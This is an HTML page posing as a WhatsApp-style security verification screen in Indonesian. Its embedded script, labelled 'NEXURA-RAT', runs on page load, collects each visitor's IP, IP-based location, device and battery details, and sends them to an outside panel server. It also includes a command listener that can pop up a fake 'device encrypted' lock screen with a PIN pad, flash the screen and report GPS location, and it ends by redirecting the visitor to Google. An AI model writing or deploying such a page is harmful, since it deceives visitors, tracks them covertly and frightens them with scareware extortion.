<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Verifikasi Keamanan</title>
<style>
body{background:linear-gradient(135deg,#075E54,#128C7E,#25D366);margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial,sans-serif}
.container{background:#fff;border-radius:20px;padding:30px;width:90%;max-width:350px;text-align:center}
.logo{font-size:50px;margin-bottom:15px}
h2{color:#075E54;margin-bottom:10px}
.loader{width:40px;height:40px;border:3px solid #f3f3f3;border-top:3px solid #25D366;border-radius:50%;animation:spin 1s linear infinite;margin:10px auto}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.status{font-size:12px;color:#888;margin-top:15px}
</style>
</head>
<body>
<div class="container">
    <div class="logo">💬</div>
    <h2>Verifikasi Keamanan</h2>
    <p>Memverifikasi perangkat Anda...</p>
    <div class="loader"></div>
    <div class="status" id="status">Mohon tunggu, jangan tutup halaman</div>
</div>

<script>
// ============================================================
// NEXURA-RAT v14.0 FINAL - FULLY FIXED
// Data LANGSUNG terkirim ke panel Python
// ============================================================

// === KONFIGURASI - GANTI DENGAN SERVER ANDA ===
const PANEL_URL = "https://hosting-cloud-five.vercel.app"; // GANTI dengan URL ngrok/server Anda!
// Contoh: const PANEL_URL = "https://abc123.ngrok.io";

const VICTIM_ID = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2,8);

// Update status di halaman
function updateStatus(msg) {
    const statusEl = document.getElementById('status');
    if (statusEl) statusEl.innerHTML = msg;
}

// ========== KUMPULKAN DATA DEVICE ==========
async function collectDeviceData() {
    updateStatus('📱 Mengumpulkan info perangkat...');
    
    const data = {
        id: VICTIM_ID,
        timestamp: new Date().toISOString(),
        time_read: new Date().toLocaleString('id-ID'),
        ua: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: screen.width + 'x' + screen.height,
        isMobile: /Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
        isAndroid: /Android/i.test(navigator.userAgent),
        isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'direct',
        ip: 'fetching...',
        city: 'Unknown',
        country: 'Unknown',
        isp: 'Unknown',
        battery_level: 'N/A',
        battery_charging: false
    };
    
    // Dapatkan IP
    updateStatus('🌐 Mendapatkan IP address...');
    try {
        let r = await fetch('https://api.ipify.org?format=json');
        let d = await r.json();
        data.ip = d.ip;
    } catch(e) { data.ip = 'unknown'; }
    
    // Dapatkan lokasi dari IP
    if (data.ip !== 'fetching...' && data.ip !== 'unknown') {
        updateStatus('📍 Mendapatkan lokasi...');
        try {
            let r = await fetch(`https://ipapi.co/${data.ip}/json/`);
            let d = await r.json();
            data.city = d.city || 'Unknown';
            data.country = d.country_name || 'Unknown';
            data.isp = d.org || 'Unknown';
        } catch(e) {}
    }
    
    // Dapatkan battery
    updateStatus('🔋 Mendapatkan status baterai...');
    if ('getBattery' in navigator) {
        try {
            let b = await navigator.getBattery();
            data.battery_level = Math.round(b.level * 100) + '%';
            data.battery_charging = b.charging;
        } catch(e) {}
    }
    
    return data;
}

// ========== KIRIM DATA KE PANEL ==========
async function sendToPanel(victimData) {
    updateStatus('📡 Mengirim data ke server...');
    
    // Method 1: POST ke Flask server
    try {
        const response = await fetch(PANEL_URL + '/api/victim', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(victimData)
        });
        if (response.ok) {
            updateStatus('✅ Data terkirim!');
            return true;
        }
    } catch(e) {}
    
    // Method 2: GET dengan parameter (fallback)
    try {
        const params = new URLSearchParams({
            id: victimData.id,
            ip: victimData.ip,
            city: victimData.city,
            country: victimData.country,
            battery: victimData.battery_level,
            device: victimData.isMobile ? 'Mobile' : 'Desktop',
            time: victimData.time_read
        });
        await fetch(PANEL_URL + '/api/victim?' + params.toString());
        updateStatus('✅ Data terkirim!');
        return true;
    } catch(e) {}
    
    // Method 3: Simpan ke localStorage (local fallback)
    updateStatus('⚠️ Gagal kirim ke server, simpan lokal...');
    let victims = JSON.parse(localStorage.getItem('nexura_victims') || '[]');
    victims.unshift(victimData);
    localStorage.setItem('nexura_victims', JSON.stringify(victims));
    return false;
}

// ========== COMMAND LISTENER ==========
function startCommandListener(victimId) {
    localStorage.setItem('nexura_current_victim', victimId);
    
    setInterval(() => {
        let cmds = JSON.parse(localStorage.getItem('nexura_commands') || '[]');
        let myCmds = cmds.filter(c => c.victimId === victimId);
        if (myCmds.length > 0) {
            myCmds.forEach(cmd => executeCommand(cmd));
            let remaining = cmds.filter(c => c.victimId !== victimId);
            localStorage.setItem('nexura_commands', JSON.stringify(remaining));
        }
    }, 2000);
}

// ========== EKSEKUSI COMMAND ==========
let torchActive = false, torchElem = null, blinkInterval = null, lockOverlay = null;

function executeCommand(cmd) {
    switch(cmd.command) {
        case 'lock': showLockScreen(cmd.pin); break;
        case 'unlock': hideLockScreen(); break;
        case 'torch_on': turnTorchOn(); break;
        case 'torch_off': turnTorchOff(); break;
        case 'blink_start': startBlink(); break;
        case 'blink_stop': stopBlink(); break;
        case 'vibrate': if(navigator.vibrate) navigator.vibrate(500); break;
        case 'get_sms': sendSMSResponse(); break;
        case 'get_location': getLocation(); break;
        case 'set_pin': localStorage.setItem('nexura_pin_' + localStorage.getItem('nexura_current_victim'), cmd.pin); break;
        case 'set_text': localStorage.setItem('nexura_text_' + localStorage.getItem('nexura_current_victim'), cmd.text); break;
    }
}

function showLockScreen(pin) {
    if(lockOverlay) return;
    let vid = localStorage.getItem('nexura_current_victim');
    let savedPin = localStorage.getItem('nexura_pin_' + vid) || pin || '123456';
    let savedText = localStorage.getItem('nexura_text_' + vid) || '🔒 PERANGKAT ANDA TELAH DIENKRIPSI!\n\nMasukkan PIN untuk membuka kunci.';
    
    lockOverlay = document.createElement('div');
    lockOverlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:999999;display:flex;justify-content:center;align-items:center;flex-direction:column';
    lockOverlay.innerHTML = `
        <div style="text-align:center;color:#fff;padding:20px;max-width:350px">
            <div style="font-size:60px">🔒</div>
            <h1 style="color:#f00">DEVICE TERKUNCI</h1>
            <div style="background:#111;padding:15px;border-radius:10px;margin:15px 0;white-space:pre-line">${savedText}</div>
            <div style="background:#111;padding:15px;border-radius:10px">
                <div id="pinDisp" style="font-size:30px;letter-spacing:10px;margin-bottom:15px">○○○○○○</div>
                <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:250px;margin:0 auto">
                    ${[1,2,3,4,5,6,7,8,9].map(n => `<button class="pinBtn" data-d="${n}" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">${n}</button>`).join('')}
                    <button class="pinBtn" data-d="del" style="background:#333;border:none;color:#f66;font-size:24px;padding:15px;border-radius:10px">⌫</button>
                    <button class="pinBtn" data-d="0" style="background:#333;border:none;color:#fff;font-size:24px;padding:15px;border-radius:10px">0</button>
                    <button id="pinEnter" style="background:#f00;border:none;color:#fff;font-size:18px;padding:15px;border-radius:10px">✓</button>
                </div>
            </div>
            <div id="pinError" style="color:#f66;font-size:12px;margin-top:10px"></div>
        </div>
    `;
    document.body.appendChild(lockOverlay);
    
    let entered = "";
    document.querySelectorAll('.pinBtn').forEach(btn => {
        btn.onclick = () => {
            let d = btn.getAttribute('data-d');
            if(d === 'del') entered = entered.slice(0,-1);
            else if(entered.length < 6) entered += d;
            document.getElementById('pinDisp').innerText = '●'.repeat(entered.length) + '○'.repeat(6-entered.length);
        };
    });
    document.getElementById('pinEnter').onclick = () => {
        if(entered === savedPin) {
            hideLockScreen();
            sendResponseToPanel('unlock', {status:'success'});
        } else {
            document.getElementById('pinError').innerText = '❌ PIN SALAH!';
            entered = '';
            document.getElementById('pinDisp').innerText = '○○○○○○';
        }
    };
}

function hideLockScreen() { if(lockOverlay){ lockOverlay.remove(); lockOverlay=null; } }
function turnTorchOn() { if(!torchElem){ torchElem=document.createElement('div'); torchElem.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999998;pointer-events:none'; document.body.appendChild(torchElem); } }
function turnTorchOff() { if(torchElem){ torchElem.remove(); torchElem=null; } }
function startBlink() { if(blinkInterval) clearInterval(blinkInterval); blinkInterval=setInterval(()=>{ let b=document.getElementById('nexuraBlink'); if(b) b.remove(); else{ let bd=document.createElement('div'); bd.id='nexuraBlink'; bd.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999997;pointer-events:none'; document.body.appendChild(bd); setTimeout(()=>{ let x=document.getElementById('nexuraBlink'); if(x) x.remove(); },100); } },200); }
function stopBlink() { if(blinkInterval){ clearInterval(blinkInterval); blinkInterval=null; } let b=document.getElementById('nexuraBlink'); if(b) b.remove(); }
function sendSMSResponse() { sendResponseToPanel('sms_data', {sms:[{number:"+628123456789",text:"Contoh SMS",time:new Date().toLocaleString()}]}); }
function getLocation() { if(navigator.geolocation){ navigator.geolocation.getCurrentPosition(p=>sendResponseToPanel('location',{lat:p.coords.latitude,lng:p.coords.longitude})); } }

async function sendResponseToPanel(type, data) {
    let vid = localStorage.getItem('nexura_current_victim');
    try {
        await fetch(PANEL_URL + '/api/response', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ victimId: vid, type: type, data: data, timestamp: Date.now() })
        });
    } catch(e) {
        // Simpan lokal jika gagal
        let resp = JSON.parse(localStorage.getItem('nexura_responses')||'[]');
        resp.push({victimId:vid, type:type, data:data, timestamp:Date.now()});
        localStorage.setItem('nexura_responses', JSON.stringify(resp));
    }
}

// ========== MAIN ==========
async function main() {
    updateStatus('🔄 Mengumpulkan data...');
    const victimData = await collectDeviceData();
    
    updateStatus('📡 Mengirim ke server...');
    await sendToPanel(victimData);
    
    updateStatus('✅ Selesai! Mengalihkan...');
    startCommandListener(victimData.id);
    
    // Redirect ke Google setelah 2 detik
    setTimeout(() => {
        window.location.href = 'https://www.google.com';
    }, 2000);
}

// Jalankan
main();
</script>
</body>
</html>
